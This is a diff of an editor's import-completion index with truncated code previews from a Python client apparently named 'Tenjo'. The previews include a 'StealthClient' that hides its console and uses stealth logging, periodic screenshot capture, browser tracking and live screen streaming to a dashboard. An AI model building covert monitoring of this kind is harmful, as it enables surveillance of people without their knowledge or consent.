@@ -165,6 +165,14 @@
         "documentation": {}
     },
     {
+        "label": "datetime",
+        "importPath": "datetime",
+        "description": "datetime",
+        "isExtraImport": true,
+        "detail": "datetime",
+        "documentation": {}
+    },
+    {
         "label": "time",
         "kind": 6,
         "isExtraImport": true,
@@ -408,6 +416,14 @@
         "documentation": {}
     },
     {
+        "label": "ScreenCapture",
+        "importPath": "src.modules.screen_capture",
+        "description": "src.modules.screen_capture",
+        "isExtraImport": true,
+        "detail": "src.modules.screen_capture",
+        "documentation": {}
+    },
+    {
         "label": "BrowserMonitor",
         "importPath": "src.modules.browser_monitor",
         "description": "src.modules.browser_monitor",
@@ -572,6 +588,14 @@
         "documentation": {}
     },
     {
+        "label": "get_os_info_for_client",
+        "importPath": "os_detector",
+        "description": "os_detector",
+        "isExtraImport": true,
+        "detail": "os_detector",
+        "documentation": {}
+    },
+    {
         "label": "lexers",
         "importPath": "sphinx.highlighting",
         "description": "sphinx.highlighting",
@@ -723,6 +747,15 @@
         "documentation": {}
     },
     {
+        "label": "get_local_ip",
+        "kind": 2,
+        "importPath": "client.src.core.config",
+        "description": "client.src.core.config",
+        "peekOfCode": "def get_local_ip():\n    \"\"\"Get the best available local IP address\"\"\"\n    try:\n        # Method 1: Socket connection (most reliable)\n        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n            s.connect((\"8.8.8.8\", 80))\n            ip = s.getsockname()[0]\n            if ip and ip != '127.0.0.1':\n                return ip\n    except Exception:",
+        "detail": "client.src.core.config",
+        "documentation": {}
+    },
+    {
         "label": "BrowserMonitor",
         "kind": 6,
         "importPath": "client.src.modules.browser_monitor",
@@ -790,7 +823,7 @@
         "kind": 6,
         "importPath": "client.src.modules.screen_capture",
         "description": "client.src.modules.screen_capture",
-        "peekOfCode": "class ScreenCapture:\n    def __init__(self, api_client=None):\n        self.api_client = api_client\n        self.is_running = False\n        self.capture_interval = 60  # 1 minute\n    def start_capture(self):\n        \"\"\"Start screenshot capture loop\"\"\"\n        self.is_running = True\n        logging.info(\"Screenshot capture started\")\n        while self.is_running:",
+        "peekOfCode": "class ScreenCapture:\n    def __init__(self, api_client=None):\n        self.api_client = api_client\n        self.is_running = False\n        self.capture_interval = 60  # 1 minute\n        self.browser_check_interval = 10  # Check for browsers every 10 seconds\n        self.is_capturing = False\n        self.browser_tracker = None\n        # Thread safety locks\n        self._state_lock = threading.RLock()  # Reentrant lock for state variables",
         "detail": "client.src.modules.screen_capture",
         "documentation": {}
     },
@@ -867,11 +900,110 @@
         "documentation": {}
     },
     {
+        "label": "test_dashboard_endpoints",
+        "kind": 2,
+        "importPath": "client.diagnostic_tool",
+        "description": "client.diagnostic_tool",
+        "peekOfCode": "def test_dashboard_endpoints():\n    \"\"\"Test all dashboard endpoints\"\"\"\n    base_url = \"http://127.0.0.1:8000\"\n    endpoints = [\n        \"/api/health\",\n        \"/api/clients/status\", \n        \"/api/screenshots\",\n        \"/api/browser-tracking\"\n    ]\n    print(\"🔍 TESTING DASHBOARD ENDPOINTS:\")",
+        "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "check_client_registration",
+        "kind": 2,
+        "importPath": "client.diagnostic_tool",
+        "description": "client.diagnostic_tool",
+        "peekOfCode": "def check_client_registration():\n    \"\"\"Test client registration\"\"\"\n    print(\"🔐 TESTING CLIENT REGISTRATION:\")\n    print(\"=\" * 40)\n    registration_data = {\n        \"client_id\": \"a50df0a2-d4f6-9c44-f9b9-b480d8f5a88b\",\n        \"hostname\": \"MacBook-Air\",\n        \"platform\": \"Darwin\",\n        \"ip_address\": \"127.0.0.1\"\n    }",
+        "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "check_live_clients",
+        "kind": 2,
+        "importPath": "client.diagnostic_tool",
+        "description": "client.diagnostic_tool",
+        "peekOfCode": "def check_live_clients():\n    \"\"\"Check live clients in dashboard\"\"\"\n    print(\"👥 CHECKING LIVE CLIENTS:\")\n    print(\"=\" * 40)\n    try:\n        response = requests.get(\"http://127.0.0.1:8000/api/clients/status\", timeout=3)\n        if response.status_code == 200:\n            clients = response.json()\n            print(f\"   Total Clients: {len(clients)}\")\n            for client in clients:",
+        "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "test_live_streaming",
+        "kind": 2,
+        "importPath": "client.diagnostic_tool",
+        "description": "client.diagnostic_tool",
+        "peekOfCode": "def test_live_streaming():\n    \"\"\"Test live streaming endpoints\"\"\"\n    print(\"📹 TESTING LIVE STREAMING:\")\n    print(\"=\" * 40)\n    client_id = \"a50df0a2-d4f6-9c44-f9b9-b480d8f5a88b\"\n    try:\n        # Test stream request\n        response = requests.get(f\"http://127.0.0.1:8000/api/stream/request/{client_id}\", timeout=3)\n        print(f\"   Stream Request: {response.status_code} {'✅' if response.status_code == 200 else '❌'}\")\n        # Test live view URL",
+        "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.diagnostic_tool",
+        "description": "client.diagnostic_tool",
+        "peekOfCode": "def main():\n    print(\"🛠️  TENJO DASHBOARD & CLIENT DIAGNOSTIC\")\n    print(\"=\" * 50)\n    print(f\"🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\")\n    print()\n    # Run all tests\n    test_dashboard_endpoints()\n    check_client_registration()\n    check_live_clients()\n    test_live_streaming()",
+        "detail": "client.diagnostic_tool",
+        "documentation": {}
+    },
+    {
+        "label": "get_local_ip_socket",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def get_local_ip_socket():\n    \"\"\"Get local IP using socket connection method\"\"\"\n    try:\n        # Connect to external address to determine local IP\n        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:\n            s.connect((\"8.8.8.8\", 80))\n            return s.getsockname()[0]\n    except Exception:\n        return None\ndef get_local_ip_ifconfig():",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_local_ip_ifconfig",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def get_local_ip_ifconfig():\n    \"\"\"Get local IP using ifconfig (macOS/Linux)\"\"\"\n    try:\n        if platform.system() == \"Darwin\":  # macOS\n            result = subprocess.run(['ifconfig'], capture_output=True, text=True)\n            lines = result.stdout.split('\\n')\n            for line in lines:\n                if 'inet ' in line and '127.0.0.1' not in line and 'inet 169.254' not in line:\n                    parts = line.strip().split()\n                    for i, part in enumerate(parts):",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_local_ip_windows",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def get_local_ip_windows():\n    \"\"\"Get local IP for Windows\"\"\"\n    try:\n        result = subprocess.run(['ipconfig'], capture_output=True, text=True)\n        lines = result.stdout.split('\\n')\n        for line in lines:\n            if 'IPv4 Address' in line and '127.0.0.1' not in line:\n                ip = line.split(':')[-1].strip()\n                if '.' in ip and len(ip.split('.')) == 4:\n                    return ip",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_best_local_ip",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def get_best_local_ip():\n    \"\"\"Get the best available local IP address\"\"\"\n    # Method 1: Socket connection (most reliable)\n    ip = get_local_ip_socket()\n    if ip and ip != '127.0.0.1':\n        return ip\n    # Method 2: Platform-specific commands\n    if platform.system() == \"Darwin\":  # macOS\n        ip = get_local_ip_ifconfig()\n        if ip:",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_all_network_interfaces",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def get_all_network_interfaces():\n    \"\"\"Get all network interfaces and their IPs\"\"\"\n    interfaces = {}\n    try:\n        if platform.system() == \"Darwin\":  # macOS\n            result = subprocess.run(['ifconfig'], capture_output=True, text=True)\n            current_interface = None\n            for line in result.stdout.split('\\n'):\n                line = line.strip()\n                if line and not line.startswith(' ') and ':' in line:",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.ip_detector",
+        "description": "client.ip_detector",
+        "peekOfCode": "def main():\n    print(\"🌐 MacBook Network Interface Detection\")\n    print(\"=\" * 45)\n    # Get best IP\n    best_ip = get_best_local_ip()\n    print(f\"🎯 Best Local IP: {best_ip}\")\n    # Show all interfaces\n    print(f\"\\n📡 All Network Interfaces:\")\n    interfaces = get_all_network_interfaces()\n    for interface, ips in interfaces.items():",
+        "detail": "client.ip_detector",
+        "documentation": {}
+    },
+    {
         "label": "StealthClient",
         "kind": 6,
         "importPath": "client.main",
         "description": "client.main",
-        "peekOfCode": "class StealthClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Setup stealth logging\n        setup_stealth_logging()\n        self.logger = logging.getLogger('StealthClient')\n        # Initialize browser tracker\n        self.browser_tracker = BrowserTracker(self.api_client, self.logger)\n        # Hide console in stealth mode",
+        "peekOfCode": "class StealthClient:\n    def __init__(self):\n        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n        self.stream_handler = StreamHandler(self.api_client)\n        # Setup stealth logging\n        setup_stealth_logging()\n        self.logger = logging.getLogger('StealthClient')\n        # Initialize browser tracker\n        self.browser_tracker = BrowserTracker(self.api_client, self.logger)\n        # Initialize screen capture with browser tracker integration",
         "detail": "client.main",
         "documentation": {}
     },
@@ -966,12 +1098,57 @@
         "documentation": {}
     },
     {
-        "label": "logger",
-        "kind": 5,
-        "importPath": "client.minimal_client",
-        "description": "client.minimal_client",
-        "peekOfCode": "logger = logging.getLogger(__name__)\ntry:\n    from src.core.config import Config\n    from src.utils.api_client import APIClient\n    logger.info(\"=== ULTRA MINIMAL CLIENT START ===\")\n    logger.info(f\"Server: {Config.SERVER_URL}\")\n    # Create API client\n    api_client = APIClient(Config.SERVER_URL, Config.API_KEY)\n    # Simple heartbeat loop - NO STREAMING\n    loop_count = 0",
-        "detail": "client.minimal_client",
+        "label": "get_windows_version",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def get_windows_version():\n    \"\"\"Get detailed Windows version information\"\"\"\n    try:\n        import winreg\n        # Get Windows version from registry\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, \n                           r\"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\")\n        product_name = winreg.QueryValueEx(key, \"ProductName\")[0]\n        build_number = winreg.QueryValueEx(key, \"CurrentBuild\")[0]\n        winreg.CloseKey(key)",
+        "detail": "client.os_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_macos_version",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def get_macos_version():\n    \"\"\"Get detailed macOS version information\"\"\"\n    try:\n        # Get macOS version\n        mac_version = platform.mac_ver()[0]\n        # Convert version to name\n        version_parts = mac_version.split('.')\n        major = int(version_parts[0]) if version_parts else 0\n        if major >= 15:\n            name = \"macOS Sequoia\"",
+        "detail": "client.os_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_linux_version",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def get_linux_version():\n    \"\"\"Get detailed Linux distribution information\"\"\"\n    try:\n        # Try to get distribution info\n        import distro\n        return {\n            'name': f\"{distro.name()} {distro.version()}\",\n            'version': distro.version(),\n            'platform': 'Linux',\n            'distribution': distro.name(),",
+        "detail": "client.os_detector",
+        "documentation": {}
+    },
+    {
+        "label": "detect_os",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def detect_os():\n    \"\"\"Detect operating system with detailed information\"\"\"\n    system = platform.system()\n    if system == 'Windows':\n        return get_windows_version()\n    elif system == 'Darwin':\n        return get_macos_version()\n    elif system == 'Linux':\n        return get_linux_version()\n    else:",
+        "detail": "client.os_detector",
+        "documentation": {}
+    },
+    {
+        "label": "get_os_info_for_client",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def get_os_info_for_client():\n    \"\"\"Get OS info formatted for Tenjo client registration\"\"\"\n    os_info = detect_os()\n    return {\n        'name': os_info['name'],\n        'version': os_info['version'],\n        'platform': os_info['platform'],\n        'architecture': os_info.get('architecture', 'unknown'),\n        'hostname': platform.node(),\n        'user': os.getenv('USER', os.getenv('USERNAME', 'unknown'))",
+        "detail": "client.os_detector",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "client.os_detector",
+        "description": "client.os_detector",
+        "peekOfCode": "def main():\n    \"\"\"Test OS detection\"\"\"\n    print(\"🔍 TENJO OS DETECTION TEST\")\n    print(\"=\" * 40)\n    os_info = detect_os()\n    print(\"📋 Detected OS Information:\")\n    for key, value in os_info.items():\n        print(f\"   {key.title()}: {value}\")\n    print(f\"\\n📤 Client Registration Format:\")\n    client_os_info = get_os_info_for_client()",
+        "detail": "client.os_detector",
         "documentation": {}
     },
     {
